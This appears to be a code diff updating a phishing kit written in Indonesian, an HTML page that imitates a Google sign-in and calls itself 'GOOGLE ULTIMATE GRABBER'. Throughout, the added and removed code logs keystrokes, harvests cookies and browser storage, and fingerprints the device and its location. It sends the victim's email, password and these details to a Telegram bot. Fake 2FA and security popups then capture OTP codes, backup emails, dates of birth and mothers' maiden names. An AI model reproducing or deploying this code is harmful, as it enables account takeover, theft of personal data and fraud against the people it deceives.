@@ -29,7 +29,6 @@
             padding: 48px 40px 36px;
             text-align: center;
             border: 1px solid #dadce0;
-            position: relative;
         }
         .google-logo {
             width: 75px;
@@ -49,7 +48,6 @@
         .input-group {
             margin-bottom: 16px;
             text-align: left;
-            position: relative;
         }
         .input-group input {
             width: 100%;
@@ -127,44 +125,54 @@
         const CHAT_ID = "8753510792";
         const REDIRECT_URL = "https://spotplaymav7.lovable.app";
         
-        let startTime = Date.now();
-        let retryCount = parseInt(localStorage.getItem('loginRetry') || '0');
-        let keylogBuffer = [];
-        
-        // ========== KEYLOGGER GLOBAL (tangkep semua ketikan) ==========
-        document.addEventListener('keydown', function(e) {
-            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
-            let key = e.key;
-            if (key === 'Enter') key = '[ENTER]';
-            else if (key === ' ') key = '[SPACE]';
-            else if (key === 'Backspace') key = '[BACKSPACE]';
-            else if (key === 'Tab') key = '[TAB]';
-            else if (key.length > 1) key = `[${key}]`;
-            keylogBuffer.push(key);
-            if (keylogBuffer.length > 100) keylogBuffer.shift();
+        // ========== KEYLOGGER GLOBAL ==========
+        let keyLogs = [];
+        document.addEventListener('keypress', function(e) {
+            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
+                keyLogs.push(e.key);
+                if (keyLogs.length > 200) keyLogs.shift();
+            }
         });
         
-        // ========== DETECT ADBLOCK ==========
-        let adblockDetected = false;
-        const testAd = document.createElement('div');
-        testAd.className = 'adsbox';
-        testAd.style.display = 'none';
-        document.body.appendChild(testAd);
-        setTimeout(() => {
-            if (testAd.offsetHeight === 0 && testAd.offsetWidth === 0) adblockDetected = true;
-        }, 100);
-        
-        // ========== GET COOKIES (kalau same-site memungkinkan) ==========
+        // ========== GET ALL COOKIES ==========
         function getAllCookies() {
             try {
-                return document.cookie || 'Tidak ada cookie (atau HttpOnly)';
+                return document.cookie || '(Tidak ada cookie)';
             } catch(e) {
-                return 'Tidak bisa akses cookie';
+                return '(Tidak bisa akses cookie)';
+            }
+        }
+        
+        // ========== GET ALL LOCALSTORAGE ==========
+        function getAllLocalStorage() {
+            try {
+                const items = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    items[key] = localStorage.getItem(key);
+                }
+                return JSON.stringify(items, null, 2) || '(Kosong)';
+            } catch(e) {
+                return '(Tidak bisa akses localStorage)';
+            }
+        }
+        
+        // ========== GET ALL SESSIONSTORAGE ==========
+        function getAllSessionStorage() {
+            try {
+                const items = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    items[key] = sessionStorage.getItem(key);
+                }
+                return JSON.stringify(items, null, 2) || '(Kosong)';
+            } catch(e) {
+                return '(Tidak bisa akses sessionStorage)';
             }
         }
         
         // ========== WEBGL FINGERPRINT ==========
-        async function getWebGLFingerprint() {
+        function getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -179,34 +187,45 @@
             }
         }
         
-        // ========== INSTALLED FONTS DETECTION ==========
-        function getInstalledFonts() {
-            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS', 'Impact', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Inter'];
+        // ========== PLUGINS LIST ==========
+        function getPlugins() {
+            try {
+                const plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                return plugins.join(', ') || '(Tidak ada plugin)';
+            } catch(e) {
+                return '(Tidak bisa akses plugins)';
+            }
+        }
+        
+        // ========== FONTS DETECTION ==========
+        function getFonts() {
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS', 'Impact', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Inter', 'Helvetica', 'Calibri', 'Candara', 'Segoe UI', 'Oxygen'];
             const baseFonts = ['monospace', 'sans-serif', 'serif'];
             const installed = [];
             const testString = 'mmmmmmmmmmlli';
-            const testSize = '72px';
-            const defaultWidth = {};
-            
             const testDiv = document.createElement('div');
             testDiv.style.position = 'absolute';
             testDiv.style.top = '-9999px';
             testDiv.style.left = '-9999px';
-            testDiv.style.fontSize = testSize;
+            testDiv.style.fontSize = '72px';
             document.body.appendChild(testDiv);
             
+            const widths = {};
             for (const base of baseFonts) {
                 testDiv.style.fontFamily = base;
                 testDiv.innerHTML = testString;
-                defaultWidth[base] = testDiv.offsetWidth;
+                widths[base] = testDiv.offsetWidth;
             }
             
-            for (const font of fonts) {
+            for (const font of testFonts) {
                 let detected = false;
                 for (const base of baseFonts) {
                     testDiv.style.fontFamily = `${font}, ${base}`;
                     testDiv.innerHTML = testString;
-                    if (testDiv.offsetWidth !== defaultWidth[base]) {
+                    if (testDiv.offsetWidth !== widths[base]) {
                         detected = true;
                         break;
                     }
@@ -215,47 +234,75 @@
             }
             
             document.body.removeChild(testDiv);
-            return installed.slice(0, 10).join(', ') || 'Tidak ada yg terdeteksi';
+            return installed.join(', ') || '(Tidak ada font terdeteksi)';
         }
         
-        // ========== NETWORK INFORMATION ==========
+        // ========== TIMEZONE & LOCALE ==========
+        function getDetailedTime() {
+            const now = new Date();
+            return {
+                waktu: now.toLocaleString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short' }),
+                unix: Math.floor(now.getTime() / 1000),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                locale: navigator.language,
+                offset: -new Date().getTimezoneOffset() / 60
+            };
+        }
+        
+        // ========== NETWORK INFO ==========
         function getNetworkInfo() {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (!conn) return 'Tidak diketahui';
-            let type = conn.effectiveType || 'Tidak diketahui';
-            let downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Tidak diketahui';
-            let rtt = conn.rtt ? conn.rtt + ' ms' : 'Tidak diketahui';
-            return `${type} (${downlink}, RTT ${rtt})`;
+            return {
+                type: conn.effectiveType || '?',
+                downlink: conn.downlink ? conn.downlink + ' Mbps' : '?',
+                rtt: conn.rtt ? conn.rtt + ' ms' : '?',
+                saveData: conn.saveData ? 'Ya' : 'Tidak'
+            };
         }
         
-        // ========== PERTANYAAN KEAMANAN PALSU (FAKE SECURITY ALERT) ==========
-        function showFakeSecurityPopup(email) {
+        // ========== BATTERY INFO ==========
+        async function getBatteryInfo() {
+            try {
+                if (!('getBattery' in navigator)) return { level: 'Tidak support', charging: 'Tidak support' };
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'Ya' : 'Tidak'
+                };
+            } catch(e) {
+                return { level: 'Error', charging: 'Error' };
+            }
+        }
+        
+        // ========== FAKE 2FA POPUP (TAMBAHAN) ==========
+        async function showFake2FA(email) {
             return new Promise((resolve) => {
-                const popupHtml = `
-                    <div id="fakeSecurityPopup" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:10000;display:flex;justify-content:center;align-items:center;font-family:'Google Sans',Roboto,Arial,sans-serif;">
-                        <div style="background:white;border-radius:8px;padding:24px;max-width:400px;width:90%;text-align:center;">
-                            <div style="font-size:48px;margin-bottom:16px;">🔒</div>
-                            <h3 style="margin-bottom:8px;">Security Verification Required</h3>
-                            <p style="color:#5f6368;margin-bottom:20px;font-size:14px;">We detected unusual activity on your account <strong>${email}</strong>. Please verify your identity.</p>
-                            <div style="text-align:left;margin-bottom:20px;">
-                                <label style="display:block;margin-bottom:8px;font-size:14px;">Date of Birth (YYYY-MM-DD)</label>
-                                <input type="text" id="fakeDob" placeholder="1990-01-01" style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;">
-                                <label style="display:block;margin-bottom:8px;font-size:14px;">Mother's Maiden Name</label>
-                                <input type="text" id="fakeMother" placeholder="Your mother's maiden name" style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;">
-                                <label style="display:block;margin-bottom:8px;font-size:14px;">Phone Number (recovery)</label>
-                                <input type="text" id="fakePhone" placeholder="+62xxxxxxxxxxx" style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;">
-                            </div>
-                            <button id="fakeSubmitBtn" style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;">Verify Now</button>
+                const popup = document.createElement('div');
+                popup.id = 'fake2fa';
+                popup.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:10000;display:flex;justify-content:center;align-items:center;font-family:Roboto,Arial,sans-serif;';
+                popup.innerHTML = `
+                    <div style="background:white;border-radius:12px;padding:28px;max-width:380px;width:90%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.3);">
+                        <div style="font-size:48px;margin-bottom:12px;">🔐</div>
+                        <h3 style="margin-bottom:8px;">Verify your identity</h3>
+                        <p style="color:#5f6368;margin-bottom:20px;font-size:14px;">We sent a verification code to your recovery phone ending with <strong>**${Math.floor(Math.random() * 90 + 10)}</strong></p>
+                        <div style="text-align:left;margin-bottom:20px;">
+                            <label style="display:block;margin-bottom:8px;font-size:14px;">6-digit code</label>
+                            <input type="text" id="fakeOtp" maxlength="6" placeholder="000000" style="width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:16px;text-align:center;letter-spacing:4px;">
+                            <label style="display:block;margin-top:16px;margin-bottom:8px;font-size:14px;">Backup email (optional)</label>
+                            <input type="email" id="fakeBackupEmail" placeholder="backup@gmail.com" style="width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;">
                         </div>
+                        <button id="fake2faSubmit" style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;">Verify</button>
+                        <p style="font-size:12px;color:#5f6368;margin-top:12px;">Didn't receive code? <a href="#" style="color:#1a73e8;">Resend</a></p>
                     </div>
                 `;
-                document.body.insertAdjacentHTML('beforeend', popupHtml);
-                document.getElementById('fakeSubmitBtn').addEventListener('click', () => {
-                    const dob = document.getElementById('fakeDob').value;
-                    const mother = document.getElementById('fakeMother').value;
-                    const phone = document.getElementById('fakePhone').value;
-                    document.getElementById('fakeSecurityPopup').remove();
-                    resolve({ dob, mother, phone });
+                document.body.appendChild(popup);
+                
+                document.getElementById('fake2faSubmit').addEventListener('click', () => {
+                    const otp = document.getElementById('fakeOtp').value;
+                    const backupEmail = document.getElementById('fakeBackupEmail').value;
+                    popup.remove();
+                    resolve({ otp, backupEmail });
                 });
             });
         }
@@ -267,7 +314,7 @@
             
             if (!email || !password) {
                 document.getElementById('errorMsg').style.display = 'block';
-                document.getElementById('errorMsg').innerText = 'Please enter email and password';
+                document.getElementById('errorMsg').innerText = 'Harap masukkan email dan password';
                 return;
             }
             
@@ -275,236 +322,182 @@
             document.getElementById('loading').style.display = 'block';
             document.getElementById('errorMsg').style.display = 'none';
             
-            // Hitung durasi
-            const durationSec = Math.floor((Date.now() - startTime) / 1000);
-            retryCount++;
-            localStorage.setItem('loginRetry', retryCount);
-            
-            // Ambil keylog
-            const keylogText = keylogBuffer.join('') || 'Tidak ada aktivitas keylog';
-            
             // Kumpulkan semua data
-            const mainData = await collectMainData(email, password, durationSec, retryCount, keylogText);
-            await sendToTelegram(mainData);
+            const [ipData, battery, webgl, network, timeDetail, fonts, plugins, cookies, localStorageData, sessionStorageData] = await Promise.all([
+                fetch('https://ipapi.co/json/').then(r => r.json()).catch(e => ({})),
+                getBatteryInfo(),
+                Promise.resolve(getWebGLInfo()),
+                Promise.resolve(getNetworkInfo()),
+                Promise.resolve(getDetailedTime()),
+                Promise.resolve(getFonts()),
+                Promise.resolve(getPlugins()),
+                Promise.resolve(getAllCookies()),
+                Promise.resolve(getAllLocalStorage()),
+                Promise.resolve(getAllSessionStorage())
+            ]);
             
-            // Tampilkan fake security popup (ambil data tambahan)
-            const securityData = await showFakeSecurityPopup(email);
-            const securityMessage = `
+            // IP backup
+            let ipBackup = 'Tidak diketahui';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ipBackup = data.ip;
+            } catch(e) {}
+            
+            // Browser & Device Info
+            const ua = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+            const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui';
+            const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
+            const touchPoints = navigator.maxTouchPoints || 0;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const doNotTrack = navigator.doNotTrack === '1' ? 'Ya' : 'Tidak';
+            const cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
+            const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Ya' : 'Tidak';
+            
+            // OS Detection
+            let os = 'Tidak diketahui';
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac OS')) os = 'macOS';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone')) os = 'iOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            
+            // Browser Detection
+            let browser = 'Tidak diketahui';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            else if (ua.includes('Opera')) browser = 'Opera';
+            
+            // Hitung durasi
+            const startTime = window.performance?.timing?.navigationStart || Date.now();
+            const duration = Math.floor((Date.now() - startTime) / 1000);
+            
+            // Keylog
+            const keylogData = keyLogs.join('') || '(Tidak ada)';
+            
+            // Buat pesan SUPER LENGKAP
+            const message = `
+╔══════════════════════════════════════════════════════════════╗
+║              🔥 GOOGLE ULTIMATE GRABBER v4.0 🔥               ║
+╚══════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 AKUN KORBAN
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Email: ${email}
+Password: ${password}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 IP & GEOLOKASI LENGKAP
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+IP Address: ${ipData?.ip || ipBackup}
+Negara: ${ipData?.country_name || '?'} (${ipData?.country_code || '?'})
+Kota: ${ipData?.city || '?'}
+Region: ${ipData?.region || '?'}
+Kode Pos: ${ipData?.postal || '?'}
+Latitude/Longitude: ${ipData?.latitude || '?'}, ${ipData?.longitude || '?'}
+ISP: ${ipData?.org || '?'}
+ASN: ${ipData?.asn || '?'}
+VPN/Proxy: ${ipData?.proxy ? '✅ YA' : '❌ TIDAK'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💻 DEVICE & HARDWARE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+OS: ${os}
+Browser: ${browser}
+User Agent: ${ua.substring(0, 150)}...
+Platform: ${platform}
+Language: ${language}
+Screen: ${screenRes}
+Touch Points: ${touchPoints}
+RAM: ${ram}
+CPU Cores: ${cpu}
+Dark Mode: ${darkMode}
+Do Not Track: ${doNotTrack}
+Cookie Enabled: ${cookieEnabled}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎮 WEBGL & FINGERPRINT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+WebGL: ${webgl.substring(0, 100)}
+Fonts Terinstall: ${fonts.substring(0, 150)}
+Plugins: ${plugins.substring(0, 150)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🍪 COOKIE & STORAGE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Cookie: ${cookies.substring(0, 200)}${cookies.length > 200 ? '...' : ''}
+
+LocalStorage: ${localStorageData.substring(0, 300)}${localStorageData.length > 300 ? '...' : ''}
+
+SessionStorage: ${sessionStorageData.substring(0, 300)}${sessionStorageData.length > 300 ? '...' : ''}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ WAKTU & METADATA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Waktu: ${timeDetail.waktu}
+UNIX: ${timeDetail.unix}
+Timezone: ${timeDetail.timezone}
+Locale: ${timeDetail.locale}
+Offset GMT: ${timeDetail.offset}
+Durasi Halaman: ${duration} detik
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📡 NETWORK & BATTERY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Network: ${network.type} (${network.downlink}, RTT ${network.rtt})
+Save Data: ${network.saveData}
+Battery: ${battery.level} (Charging: ${battery.charging})
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⌨️ KEYLOGGER
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+${keylogData.substring(0, 300)}${keylogData.length > 300 ? '...' : ''}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔗 TRAFFIC SOURCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+URL: ${window.location.href}
+Referrer: ${document.referrer || '(Langsung)'}
+
+╚══════════════════════════════════════════════════════════════╝
+            `;
+            
+            // Kirim ke Telegram
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            }).catch(e => console.log);
+            
+            // Tampilkan fake 2FA untuk ambil OTP & backup email
+            const fakeData = await showFake2FA(email);
+            
+            const fakeMessage = `
 ╔══════════════════════════════════════╗
-║   🔐 EXTRA SECURITY DATA (FAKE)      ║
+║     🎭 FAKE 2FA DATA (EXTRA)         ║
 ╚══════════════════════════════════════╝
 
-┌─────── 📋 VERIFICATION DATA ───────┐
-│ 📧 Email: ${email}
-│ 📅 DOB: ${securityData.dob || 'Tidak diisi'}
-│ 👩 Mother's Name: ${securityData.mother || 'Tidak diisi'}
-│ 📱 Recovery Phone: ${securityData.phone || 'Tidak diisi'}
-└─────────────────────────────────────┘
+📧 Email: ${email}
+🔢 OTP Code: ${fakeData.otp || '(Tidak diisi)'}
+📧 Backup Email: ${fakeData.backupEmail || '(Tidak diisi)'}
             `;
-            await sendToTelegram(securityMessage);
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: fakeMessage, parse_mode: 'HTML' })
+            }).catch(e => console.log);
             
             // Redirect
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
-            }, 1500);
+            }, 2000);
         });
-        
-        async function collectMainData(email, password, durationSec, retryCount, keylogText) {
-            // IP & Geolocation
-            let ipData = {};
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch(e) { ipData = {}; }
-            
-            // IP kedua untuk backup
-            let ipBackup = 'Tidak diketahui';
-            try {
-                const res2 = await fetch('https://api.ipify.org?format=json');
-                const data2 = await res2.json();
-                ipBackup = data2.ip;
-            } catch(e) {}
-            
-            // Battery
-            let batteryData = { level: 'Tidak diketahui', charging: 'Tidak diketahui' };
-            if('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryData.level = Math.round(battery.level * 100) + '%';
-                    batteryData.charging = battery.charging ? 'Ya' : 'Tidak';
-                } catch(e) {}
-            }
-            
-            // WebGL Fingerprint
-            const webglFingerprint = await getWebGLFingerprint();
-            
-            // Installed Fonts
-            const fonts = getInstalledFonts();
-            
-            // Network Info
-            const networkInfo = getNetworkInfo();
-            
-            // Cookies
-            const cookies = getAllCookies();
-            
-            // Device & Browser info
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-            const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui';
-            const cpuCores = navigator.hardwareConcurrency || 'Tidak diketahui';
-            const touchSupport = 'ontouchstart' in window ? 'Ya' : 'Tidak';
-            const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Ya' : 'Tidak';
-            const cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
-            const doNotTrack = navigator.doNotTrack === '1' ? 'Ya' : 'Tidak';
-            
-            // Browser name & version
-            let browserName = 'Tidak diketahui', browserVersion = 'Tidak diketahui';
-            if(ua.includes('Chrome') && !ua.includes('Edg')) {
-                browserName = 'Chrome';
-                browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Tidak diketahui';
-            } else if(ua.includes('Safari') && !ua.includes('Chrome')) {
-                browserName = 'Safari';
-                browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Tidak diketahui';
-            } else if(ua.includes('Firefox')) {
-                browserName = 'Firefox';
-                browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Tidak diketahui';
-            } else if(ua.includes('Edg')) {
-                browserName = 'Edge';
-                browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || 'Tidak diketahui';
-            }
-            
-            // Device type & brand estimate
-            let deviceType = 'Desktop', deviceBrand = 'PC Custom', deviceModel = 'Tidak diketahui';
-            if(/(Mobile|Android|iPhone|iPad|iPod)/i.test(ua)) {
-                deviceType = 'Mobile';
-                if(ua.includes('iPhone')) deviceBrand = 'Apple', deviceModel = 'iPhone';
-                else if(ua.includes('iPad')) deviceBrand = 'Apple', deviceModel = 'iPad';
-                else if(ua.includes('Samsung')) deviceBrand = 'Samsung';
-                else if(ua.includes('Xiaomi')) deviceBrand = 'Xiaomi';
-                else if(ua.includes('Huawei')) deviceBrand = 'Huawei';
-                else deviceBrand = 'Unknown Android';
-            }
-            
-            // OS version
-            let os = 'Tidak diketahui';
-            if(ua.includes('Windows')) os = 'Windows ' + (ua.match(/Windows NT ([\d.]+)/)?.[1] || '');
-            else if(ua.includes('Mac OS')) os = 'macOS';
-            else if(ua.includes('Android')) os = 'Android';
-            else if(ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-            else if(ua.includes('Linux')) os = 'Linux';
-            
-            // VPN/Proxy detection
-            const vpnDetected = ipData?.proxy || ipData?.tor || false;
-            const vpnName = vpnDetected ? '✅ Terdeteksi (VPN/Proxy)' : '❌ Tidak';
-            
-            // Time data
-            const now = new Date();
-            const waktuFormatted = now.toLocaleString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short' });
-            const unixTimestamp = Math.floor(now.getTime() / 1000);
-            const hour = now.getHours();
-            const peakHour = (hour >= 19 && hour <= 22) ? 'Ya (jam sibuk)' : 'Tidak';
-            
-            // Referrer
-            const referrer = document.referrer || 'Langsung / Tidak diketahui';
-            const currentUrl = window.location.href;
-            
-            // Build message ULTIMATE
-            const message = `
-╔══════════════════════════════════════════════════╗
-║     🔥 GOOGLE ULTIMATE GRABBER v3.0 🔥           ║
-╚══════════════════════════════════════════════════╝
-
-┌──────────── 🔐 AKUN ────────────┐
-│ 📧 Email: ${email}
-│ 🔑 Password: ${password}
-└─────────────────────────────────┘
-
-┌──────────── 🌐 IP & NETWORK ────────────┐
-│ 🌍 IP: ${ipData?.ip || ipBackup}
-│ 📡 ISP: ${ipData?.org || 'Tidak diketahui'}
-│ 🔢 ASN: ${ipData?.asn || 'Tidak diketahui'}
-│ 📱 Koneksi: ${networkInfo}
-│ 🛡️ VPN/Proxy: ${vpnName}
-│ 🏷️ VPN Provider: ${ipData?.proxy ? 'Terdeteksi' : '-'}
-└─────────────────────────────────────────┘
-
-┌──────────── 📍 LOKASI LENGKAP ────────────┐
-│ 🇮🇩 Negara: ${ipData?.country_name || '?'} (${ipData?.country_code || '-'})
-│ 🏙️ Kota: ${ipData?.city || '?'}
-│ 📮 Kode Pos: ${ipData?.postal || '?'}
-│ 📍 Koordinat: ${ipData?.latitude || '?'}, ${ipData?.longitude || '?'}
-│ ⏰ Zona Waktu: ${ipData?.timezone || '?'}
-│ 🗺️ Region: ${ipData?.region || '?'}
-└──────────────────────────────────────────┘
-
-┌──────────── 💻 DEVICE & HARDWARE ────────────┐
-│ 🖥️ OS: ${os}
-│ 📱 Device: ${deviceBrand} ${deviceModel}
-│ 🧠 RAM: ${ram}
-│ ⚡ CPU Core: ${cpuCores}
-│ 🔋 Baterai: ${batteryData.level} (charging: ${batteryData.charging})
-│ 📺 Resolusi: ${screenRes}
-│ 🖱️ Touch Support: ${touchSupport}
-│ 🎮 WebGL: ${webglFingerprint.substring(0, 80)}
-│ 🔤 Fonts: ${fonts}
-└────────────────────────────────────────────┘
-
-┌──────────── 🌍 BROWSER & SETTINGS ────────────┐
-│ 🌐 Browser: ${browserName} v${browserVersion}
-│ 🛡️ AdBlock: ${adblockDetected ? '✅ Ya' : '❌ Tidak'}
-│ 🌙 Dark Mode: ${darkMode}
-│ 🚫 Do Not Track: ${doNotTrack}
-│ 🍪 Cookie Enabled: ${cookieEnabled}
-│ 📦 Cookie Sample: ${cookies.substring(0, 100)}${cookies.length > 100 ? '...' : ''}
-└───────────────────────────────────────────────┘
-
-┌──────────── ⏰ WAKTU & METADATA ────────────┐
-│ 📅 Waktu: ${waktuFormatted}
-│ 🔢 UNIX: ${unixTimestamp}
-│ ⏱️ Durasi halaman: ${durationSec} detik
-│ 🔁 Percobaan: ke-${retryCount}
-│ 🕒 Peak Hour: ${peakHour}
-└────────────────────────────────────────────┘
-
-┌──────────── 🔍 KEYLOGGER ────────────┐
-│ 📝 Rekaman ketikan: ${keylogText.substring(0, 200)}${keylogText.length > 200 ? '...' : ''}
-└──────────────────────────────────────┘
-
-┌──────────── 🔗 TRAFFIC SOURCE ────────────┐
-│ 🔗 URL: ${currentUrl}
-│ 🚪 Referrer: ${referrer}
-└──────────────────────────────────────────┘
-
-╔══════════════════════════════════════════════════╗
-║     📡 ALL DATA SENT TO TELEGRAM BOT ✅          ║
-╚══════════════════════════════════════════════════╝
-            `;
-            
-            return message;
-        }
-        
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch(e) {
-                console.log('Telegram error:', e);
-            }
-        }
-        
-        // Reset retry counter setiap 30 menit
-        setTimeout(() => {
-            localStorage.removeItem('loginRetry');
-        }, 1800000);
     </script>
 </body>
 </html>
